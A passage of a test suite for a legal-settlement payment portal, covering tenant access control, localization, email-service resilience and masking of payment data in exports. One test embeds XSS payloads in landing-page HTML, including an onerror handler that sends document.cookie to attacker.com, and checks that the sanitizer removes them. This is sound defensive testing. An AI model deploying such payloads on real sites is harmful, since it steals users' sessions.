      expect(updatedClaimant!.status).toBe('pending_selection');
      expect(updatedClaimant!.emailSent).toBe(false);
      expect(updatedClaimant!.paymentSelectionToken).not.toBe('old_token_123');
      expect(updatedClaimant!.paymentSelectionToken).toHaveLength(64);
    });

    it('[ADMIN-RES-04] RBAC & Tenant boundaries: auditor cannot resolve; cross-tenant resolution is forbidden', async () => {
      const exceptionA = await ReconciliationException.create({
        caseId: suiteCaseA._id,
        claimId: 'CLM-TENANT-RBAC-01',
        amount: 200.0,
        status: 'RETURNED',
        exceptionType: 'ach_return',
        returnCode: 'R01',
        resolved: false
      });

      // 1. Auditor cannot resolve exceptions (HTTP 403)
      const resAuditor = await request(app)
        .post(`/api/cases/${suiteCaseA.id}/exceptions/${exceptionA._id}/resolve`)
        .set('Authorization', `Bearer ${firmAAuditorToken}`)
        .send({ action: 'mark_resolved', reason: 'Audit resolution attempt' });

      expect(resAuditor.status).toBe(403);
      expect(resAuditor.body.error).toContain('Forbidden');

      // 2. Firm B Admin cannot resolve Firm A exception (HTTP 403 Cross-Tenant)
      const resCrossTenant = await request(app)
        .post(`/api/cases/${suiteCaseA.id}/exceptions/${exceptionA._id}/resolve`)
        .set('Authorization', `Bearer ${firmBAdminToken}`)
        .send({ action: 'mark_resolved', reason: 'Firm B intrusion attempt' });

      expect(resCrossTenant.status).toBe(403);
      expect(resCrossTenant.body.error).toContain('Forbidden');
    });
  });

  // =========================================================================
  // BATTERY 3: ADDENDUM 3 — LOCALIZATION (i18n) & XSS NEUTRALIZATION
  // =========================================================================
  describe('Battery 3: Addendum 3 — Landing Page Localization & XSS Neutralization', () => {
    it('[I18N-RESOLVE-01] Resolves requested language via query parameter (?lang=es, ?lang=zh)', async () => {
      const testToken = 'b'.repeat(64);
      await Claimant.create({
        caseId: localizedCase._id,
        claimId: 'CLM-I18N-01',
        firstName: 'Maria',
        lastName: 'Garcia',
        email: 'maria@example.local',
        settlementAmount: 300.0,
        status: 'pending_selection',
        paymentSelectionToken: testToken
      });

      // 1. Query for Chinese (?lang=zh)
      const resZh = await request(app).get(`/api/public/claim/${testToken}?lang=zh`);
      expect(resZh.status).toBe(200);
      expect(resZh.body.case.currentLanguage).toBe('zh');
      expect(resZh.body.case.landingPageText.headline).toContain('官方和解金付款门户');
      expect(resZh.body.case.landingPageText.introHtml).toContain('请在截止日期之前选择');

      // 2. Query for English (?lang=en)
      const resEn = await request(app).get(`/api/public/claim/${testToken}?lang=en`);
      expect(resEn.status).toBe(200);
      expect(resEn.body.case.currentLanguage).toBe('en');
      expect(resEn.body.case.landingPageText.headline).toContain('Official Settlement Payment Portal');

      // 3. Query for Spanish (?lang=es)
      const resEs = await request(app).get(`/api/public/claim/${testToken}?lang=es`);
      expect(resEs.status).toBe(200);
      expect(resEs.body.case.currentLanguage).toBe('es');
      expect(resEs.body.case.landingPageText.headline).toContain('Portal Oficial de Pagos');
    });

    it('[I18N-RESOLVE-02] Falls back cleanly to defaultLanguage when unsupported locale is requested', async () => {
      const testToken = 'c'.repeat(64);
      await Claimant.create({
        caseId: localizedCase._id,
        claimId: 'CLM-I18N-02',
        firstName: 'Pierre',
        lastName: 'Dubois',
        email: 'pierre@example.local',
        settlementAmount: 200.0,
        status: 'pending_selection',
        paymentSelectionToken: testToken
      });

      // Request French (unsupported)
      const resFr = await request(app).get(`/api/public/claim/${testToken}?lang=fr`);
      expect(resFr.status).toBe(200);
      // Fallback is 'es' (case's defaultLanguage)
      expect(resFr.body.case.currentLanguage).toBe('es');
      expect(resFr.body.case.landingPageText.headline).toContain('Portal Oficial de Pagos');
    });

    it('[I18N-RESOLVE-03] Parses and honors Accept-Language header when query param is absent', async () => {
      const testToken = 'd'.repeat(64);
      await Claimant.create({
        caseId: localizedCase._id,
        claimId: 'CLM-I18N-03',
        firstName: 'Wei',
        lastName: 'Chen',
        email: 'wei@example.local',
        settlementAmount: 400.0,
        status: 'pending_selection',
        paymentSelectionToken: testToken
      });

      const resHeader = await request(app)
        .get(`/api/public/claim/${testToken}`)
        .set('Accept-Language', 'zh-CN,zh;q=0.9,en;q=0.8');

      expect(resHeader.status).toBe(200);
      expect(resHeader.body.case.currentLanguage).toBe('zh');
      expect(resHeader.body.case.landingPageText.headline).toContain('官方和解金付款门户');
    });

    it('[I18N-XSS-01] Neutralizes adversarial XSS vectors embedded in localized landing page HTML', async () => {
      const xssCase = await Case.create({
        name: 'XSS Adversarial Case',
        docketNumber: 'XSS-2026-ADV',
        lawFirmId: 'FIRM-A',
        settlementFundTotal: 100000,
        disbursementDeadline: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000),
        fallbackPaymentMethod: 'physical_check',
        status: 'active',
        defaultLanguage: 'en',
        supportedLanguages: ['en'],
        landingPageText: {
          headline: 'XSS Injected Page',
          introHtml: `
            <script>alert("pwned")</script>
            <p>Legitimate paragraph</p>
            <iframe src="http://evil.com"></iframe>
            <img src="invalid-image" onerror="fetch('http://attacker.com/?cookie='+document.cookie)" />
            <svg onload="alert(1)"><circle cx="10" cy="10" r="5" /></svg>
            <a href="javascript:alert('malicious')">Click Here</a>
          `,
          faqAccordion: [
            {
              question: '<script>alert("faq_q")</script>What is this?',
              answer: '<p>Safe answer</p><img src="x" onerror="alert(2)" />'
            }
          ],
          supportContact: 'support@claims.local'
        }
      });

      const testToken = 'e'.repeat(64);
      await Claimant.create({
        caseId: xssCase._id,
        claimId: 'CLM-XSS-01',
        firstName: 'Victim',
        lastName: 'User',
        email: 'victim@example.local',
        settlementAmount: 100.0,
        status: 'pending_selection',
        paymentSelectionToken: testToken
      });

      const res = await request(app).get(`/api/public/claim/${testToken}`);
      expect(res.status).toBe(200);

      const introHtml = res.body.case.landingPageText.introHtml;

      // 1. Script and iframe tags are completely stripped
      expect(introHtml).not.toContain('<script>');
      expect(introHtml).not.toContain('alert("pwned")');
      expect(introHtml).not.toContain('<iframe');

      // 2. Dangerous event handlers are stripped
      expect(introHtml).not.toContain('onerror=');
      expect(introHtml).not.toContain('onload=');

      // 3. javascript: pseudo-protocols are neutralized to #
      expect(introHtml).not.toContain('javascript:');
      expect(introHtml).toContain('href="#"');

      // 4. Safe paragraph is preserved
      expect(introHtml).toContain('<p>Legitimate paragraph</p>');

      // 5. FAQ accordion answer strips onerror
      const faqAnswer = res.body.case.landingPageText.faqAccordion[0].answer;
      expect(faqAnswer).not.toContain('onerror=');
      expect(faqAnswer).toContain('<p>Safe answer</p>');
    });
  });

  // =========================================================================
  // BATTERY 4: ADDENDUM 1 (R8) — GMAIL SERVICE ADAPTER RESILIENCE & BOUNCE PRE-FLIGHT
  // =========================================================================
  describe('Battery 4: Addendum 1 (R8) — Gmail Service Adapter Downtime, Timeout & Error Resilience', () => {
    it('[GMAIL-DOWN-01] GmailService handles complete downtime / connection refused without unhandled crashes', async () => {
      // Point GMAIL_SERVICE_URL to an unused port where nothing is listening
      (config as any).GMAIL_SERVICE_URL = 'http://127.0.0.1:54321';

      // 1. Health check returns false cleanly
      const healthy = await GmailService.isHealthy();
      expect(healthy).toBe(false);

      // 2. Send email returns error response cleanly
      const sendRes = await GmailService.sendEmail({
        to: 'recipient@example.local',
        subject: 'Settlement Notice',
        bodyHtml: '<p>Payment Notice</p>'
      });
      expect(sendRes.success).toBe(false);
      expect(sendRes.error).toContain('Gmail service request failed');

      // 3. Bounce check returns error response cleanly
      const bounceRes = await GmailService.checkBounce('recipient@example.local');
      expect(bounceRes.success).toBe(false);
      expect(bounceRes.error).toContain('Gmail bounce check failed');

      // 4. Scan bounces returns error response cleanly
      const scanRes = await GmailService.scanBounces(10);
      expect(scanRes.success).toBe(false);
      expect(scanRes.error).toBeDefined();
    });

    it('[GMAIL-FAILOPEN-01] checkBouncePreflight fails open when Gmail service is down to preserve legitimate claims', async () => {
      (config as any).GMAIL_SERVICE_URL = 'http://127.0.0.1:54321';
      (config as any).EMAIL_PROVIDER = 'gmail_service';

      // Legitimate email address should NOT be blocked if telemetry service is down
      const preflight = await checkBouncePreflight('legitimate.claimant@domain.com');
      expect(preflight.eligible).toBe(true);
      expect(preflight.suppressed).toBe(false);

      // Malformed email syntax is still blocked by Layer 1 validation
      const badSyntax = await checkBouncePreflight('not-an-email');
      expect(badSyntax.eligible).toBe(false);
      expect(badSyntax.suppressed).toBe(true);
      expect(badSyntax.bounceType).toBe('syntax_error');
    });

    it('[GMAIL-FAILOPEN-02] executeScanGmailBounces fails open when Gmail service is unreachable', async () => {
      (config as any).GMAIL_SERVICE_URL = 'http://127.0.0.1:54321';

      const scanResult = await executeScanGmailBounces();
      expect(scanResult.healthy).toBe(false);
      expect(scanResult.scanned).toBe(0);
      expect(scanResult.bouncesDetected).toBe(0);
      expect(scanResult.updatedClaimantCount).toBe(0);
      expect(scanResult.message).toContain('fail-open');
    });

    it('[GMAIL-500-01] Gracefully captures HTTP 500 error responses from Gmail Service', async () => {
      // Configure mock server to return HTTP 500
      (config as any).GMAIL_SERVICE_URL = `http://127.0.0.1:${mockGmailPort}`;
      mockGmailHandler = (req, res) => {
        if (req.url === '/health') {
          res.writeHead(500, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ error: 'Internal Server Error' }));
        } else if (req.url === '/api/gmail/send') {
          res.writeHead(500, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ error: 'Mailbox quota exceeded' }));
        } else if (req.url?.startsWith('/api/gmail/bounces/check')) {
          res.writeHead(500, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ error: 'Database unavailable' }));
        }
      };

      const health = await GmailService.isHealthy();
      expect(health).toBe(false);

      const sendRes = await GmailService.sendEmail({
        to: 'claimant@example.com',
        subject: 'Notice',
        bodyHtml: '<p>Notice</p>'
      });
      expect(sendRes.success).toBe(false);
      expect(sendRes.error).toContain('Mailbox quota exceeded');

      const bounceRes = await GmailService.checkBounce('claimant@example.com');
      expect(bounceRes.success).toBe(false);
      expect(bounceRes.error).toContain('Database unavailable');
    });

    it('[GMAIL-SUPPRESS-01] Identifies suppressed recipient in pre-flight bounce check when service reports suppression', async () => {
      (config as any).GMAIL_SERVICE_URL = `http://127.0.0.1:${mockGmailPort}`;
      (config as any).EMAIL_PROVIDER = 'gmail_service';

      mockGmailHandler = (req, res) => {
        if (req.url?.startsWith('/api/gmail/bounces/check')) {
          res.writeHead(200, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({
            success: true,
            data: {
              email: 'suppressed@bounced.local',
              suppressed: true,
              reason: '550 5.1.1 User unknown / permanent bounce',
              bounceType: 'hard'
            }
          }));
        }
      };

      const preflight = await checkBouncePreflight('suppressed@bounced.local');
      expect(preflight.eligible).toBe(false);
      expect(preflight.suppressed).toBe(true);
      expect(preflight.bounceType).toBe('hard');
      expect(preflight.reason).toContain('User unknown');
    });

    it('[GMAIL-SCAN-01] executeScanGmailBounces marks matching claimants as bounced with audit reasons', async () => {
      (config as any).GMAIL_SERVICE_URL = `http://127.0.0.1:${mockGmailPort}`;

      // Create claimant awaiting bounce detection
      const clm = await Claimant.create({
        caseId: suiteCaseA._id,
        claimId: 'CLM-BOUNCE-DETECTION-01',
        firstName: 'Dead',
        lastName: 'Mailbox',
        email: 'deadbox@domain.local',
        settlementAmount: 150.0,
        status: 'pending_selection',
        bounced: false
      });

      mockGmailHandler = (req, res) => {
        if (req.url === '/health') {
          res.writeHead(200, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ status: 'ok' }));
        } else if (req.url === '/api/gmail/bounces/scan') {
          res.writeHead(200, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({
            success: true,
            data: {
              scanned: 10,
              bouncesDetected: 1,
              newBounces: [
                {
                  recipient: 'deadbox@domain.local',
                  bounceType: 'hard',
                  diagnosticMessage: '550 Recipient does not exist'
                }
              ]
            }
          }));
        }
      };

      const result = await executeScanGmailBounces({ limit: 10 });
      expect(result.healthy).toBe(true);
      expect(result.bouncesDetected).toBe(1);
      expect(result.updatedClaimantCount).toBe(1);

      // Verify claimant was updated in MongoDB
      const updatedClm = await Claimant.findById(clm._id);
      expect(updatedClm!.bounced).toBe(true);
      expect(updatedClm!.bouncedAt).toBeDefined();
      expect(updatedClm!.bounceReason).toContain('550 Recipient does not exist');
    });
  });

  // =========================================================================
  // BATTERY 5: PII/PCI MASKING VERIFICATION ACROSS ALL PAYMENT RAILS
  // =========================================================================
  describe('Battery 5: PII/PCI Masking Verification Across All Payment Rails in Logs and CSV Export', () => {
    it('[MASK-ACH-01] ACH bank account number is masked and raw number never exposed in export', () => {
      const masked = maskPaymentDetails('ach', {
        routingNumber: '021000021',
        accountNumber: '123456789012'
      });

      expect(masked).toContain('Routing: 021000021');
      expect(masked).toContain('Account: ****9012');
      expect(masked).not.toContain('123456789012');
      expect(masked).not.toContain('12345678');
    });

    it('[MASK-DEBIT-01] Debit PAN and CVV are strictly masked; CVV is never exported', () => {
      const masked = maskPaymentDetails('debit_card', {
        cardNumber: '4111222233334444',
        pan: '4111222233334444',
        cvv: '123'
      });

      expect(masked).toContain('Card: **** **** **** 4444');
      expect(masked).toContain('Exp: **/**');
      expect(masked).not.toContain('411122223333');
      expect(masked).not.toContain('123'); // CVV must never appear
    });

    it('[MASK-BTC-01] Long Bitcoin addresses are truncated with ellipsis in audit export', () => {
      const masked = maskPaymentDetails('bitcoin', {
        bitcoinAddress: 'bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq'
      });

      expect(masked).toBe('BTC: bc1qar...wf5mdq');
    });

    it('[MASK-CSV-SCAN-01] Full corpus scan of emitted CSV lines verifies ZERO unmasked PANs, CVVs, or full bank accounts', () => {
      const claimants: any[] = [
        {
          claimId: 'CLM-SCAN-01',
          firstName: 'Alice',
          lastName: 'ACH',
          settlementAmount: 100.0,
          status: 'selected',
          selectedPaymentMethod: 'ach',
          paymentDetails: { routingNumber: '021000021', accountNumber: '9876543210' }
        },
        {
          claimId: 'CLM-SCAN-02',
          firstName: 'Bob',
          lastName: 'Card',
          settlementAmount: 200.0,
          status: 'selected',
          selectedPaymentMethod: 'debit_card',
          paymentDetails: { cardNumber: '4111222233334444', cardLast4: '4444' }
        },
        {
          claimId: 'CLM-SCAN-03',
          firstName: 'Charlie',
          lastName: 'Crypto',
          settlementAmount: 300.0,
          status: 'selected',
          selectedPaymentMethod: 'bitcoin',
          paymentDetails: { bitcoinAddress: 'bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq' }
        }
      ];

      const exceptionMap = new Map();

      for (const clm of claimants) {
        const row = buildAuditLedgerRow(clm, exceptionMap);
        const line = row.join(',');

        // 1. Zero 16-digit unmasked card numbers
        expect(line).not.toMatch(/\b\d{4}[- ]?\d{4}[- ]?\d{4}[- ]?\d{4}\b/);

        // 2. Zero 9+ digit unmasked account numbers
        expect(line).not.toContain('9876543210');

        // 3. Masked values are present
        if (clm.selectedPaymentMethod === 'ach') {
          expect(line).toContain('Account: ****3210');
        } else if (clm.selectedPaymentMethod === 'debit_card') {
          expect(line).toContain('Card: **** **** **** 4444');
        } else if (clm.selectedPaymentMethod === 'bitcoin') {
          expect(line).toContain('BTC: bc1qar...wf5mdq');
        }
      }
    });

    it('[MASK-CSV-RFC-01] RFC 4180 escaping properly encapsulates special characters in CSV rows', () => {
      const complexClaimant: any = {
        claimId: 'CLM-RFC-01',
        firstName: 'John "Jack", Jr.',
        lastName: 'O\'Connor; Esq.',
        settlementAmount: 150.0,
        status: 'selected',
        selectedPaymentMethod: 'physical_check',
        paymentDetails: {
          street: '123 Main St, Suite 400',
          city: 'New York; Metro',
          state: 'NY',
          zip: '10001'
        }
      };

      const row = buildAuditLedgerRow(complexClaimant, new Map());
      // The masked details should be safely represented
      expect(row[11]).toContain('Mailed to: 123 Main St, Suite 400, New York; Metro, NY 10001');
    });
  });
});
